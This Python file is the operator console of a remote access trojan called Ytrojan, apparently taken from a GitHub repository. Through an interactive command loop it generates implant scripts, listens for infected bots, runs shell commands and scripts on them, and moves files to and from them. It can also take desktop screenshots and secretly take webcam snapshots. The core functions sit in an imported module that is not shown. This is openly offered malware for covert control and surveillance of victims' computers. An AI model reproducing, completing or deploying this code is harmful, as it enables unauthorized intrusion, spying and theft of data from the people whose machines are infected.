# https://github.com/ycy20090311/Ytrojan

import zlib
import base64
import socket
import control
import threading


def info(message:str) -> None:
    print("\033[32m[info]\033[0m %s" % message)
    
def error(message:str) -> None:
    print("\033[31m[error]\033[0m %s" % message)

def help() -> None:
    print("""
  generate <host> <port> <path>              Generate a Script
  service <host> <port>                      Start a listening service
  botlist                                    List connected bots
  sysinfo <id>                               Get system information of a bot
  shell <id> <command>                       Execute command on a bot (timeout)
  shell_nt <id> <command>                    Execute command on a bot (not timeout)
  script <id> <path>                         Execute script on a bot
  download <id> <remote_path> <local_path>   Download file from a bot
  upload <id> <local_path> <remote_path>     Upload file to a bot
  screenshot <id> <path>                     Take screenshot of a bot's desktop
  webcamlist <id>                            List webcams connected to a bot
  webcamsnap <id> <index> <path>             Take a snapshot from a webcam connected to a bot
  kill <id>                                  Kill a bot
  exit                                       Exit the program
    """)


def main() -> None:
    
    print("""
    \033[32m__   ___             _             ____  \033[0m
    \033[32m\ \ / / |_ _ __ ___ (_) __ _ _ __ |___ \ \033[0m
    \033[32m \ V /| __| '__/ _ \| |/ _` | '_ \  __) |\033[0m
    \033[35m  | | | |_| | | (_) | | (_| | | | |/ __/ \033[0m
    \033[35m  |_|  \__|_|  \___// |\__,_|_| |_|_____|\033[0m
    \033[35m                  |__/                   \033[0m
    """)
    
    while True: 
        
        try:
            command = input("> ").split()
            
            match command[0]:
                
                case "help":
                    help()
                
                case "generate":
                    control.generate(command[1],command[2],command[3])
                    info(f"Scripts are generated to %s" % command[3])
                    
                case "service":
                    _socket = socket.socket()
                    _socket.bind((command[1],int(command[2])))
                    _socket.listen()
                    thread = threading.Thread(target=control.service,args=(_socket,))
                    thread.daemon = True 
                    thread.start()
                    info("The listening service is enabled")
                    
                case "botlist":
                    if control.bot_list:
                        info("listing information")
                        for bot_socket in control.bot_list:
                            print("bot_id:%d  address:%s" % (control.bot_list.index(bot_socket),bot_socket.getpeername()[0]))
                    else:
                        error("There is no bot connection")
                
                case "sysinfo":
                    sysinfo = control.sysinfo(control.bot_list[int(command[1])])
                    info("Command execution successful")
                    for (key,value) in sysinfo.items():
                        print("%s: %s" % (key,value))
                    
                case "shell":
                    status,output = control.shell(control.bot_list[int(command[1])],command[2:],True)
                    if status:
                        info("Command execution successful")
                        print(output)
                    else:
                        error("Command execution failed")
                        
                case "shell_nt":
                    status,output = control.shell(control.bot_list[int(command[1])],command[2:],False)
                    if status:
                        info("Command execution successful")
                        print(output)
                    else:
                        error("Command execution failed")
                
                case "script":
                    status,output = control.script(control.bot_list[int(command[1])],command[2])
                    if status:
                        info("Command execution successful")
                        print(output)
                    else:
                        error("Command execution failed")
                    
                case "download":
                    status = control.download(control.bot_list[int(command[1])],command[2],command[3])
                    if status:
                        info("The file has been saved to %s" % command[3])
                    else:
                        error("The file has been downloaded failed")
                    
                case "upload":
                    status = control.upload(control.bot_list[int(command[1])],command[2],command[3])
                    if status:
                        info("The file has been uploaded successfully")
                    else:
                        error("The file has been uploaded failed")
                        
                case "screenshot":
                    status = control.screenshot(control.bot_list[int(command[1])],command[2])
                    if status:
                        info("The image has been saved to %s" % command[2])
                    else:
                        error("The screenshot was failed")
                        
                case "webcamlist":
                    status,webcamlist = control.webcamlist(control.bot_list[int(command[1])])
                    if status:
                        info("Command execution successful")
                        for webcam in webcamlist:
                            print("webcam_id: %d width: %d height: %d" % (webcam[0],webcam[1],webcam[2]))
                    else:
                        error("No webcams were detected")
                
                case "webcamsnap":
                    status = control.webcamsnap(control.bot_list[int(command[1])],int(command[2]),command[3])
                    if status:
                        info("the image has been saved to %s" % command[3])
                    else:
                        error("Failed to call the webcam")
                        
                case "kill":
                    control.kill(int(command[1]))
                    info("The bot was removed")
                        
                case "exit":
                    info("exit")
                    return
                    
                case _:
                    error("not command %s" % command[0])
            
        except control.NetError:
            control.kill(int(command[1]))
            error("Bot closed")
            
        except OSError:
            error("OS error")
        
        except PermissionError:
            error("Permission error")
        
        except FileNotFoundError:
            error("FileNotFound error")
        
        except IsADirectoryError:
            error("IsDirectory error")
            
        except (IndexError,ValueError):
            error("Parameter error")
            
        except KeyboardInterrupt:
            print("")
        
        except EOFError:
            info("exit")
            return
        
if __name__ == "__main__":
    main()
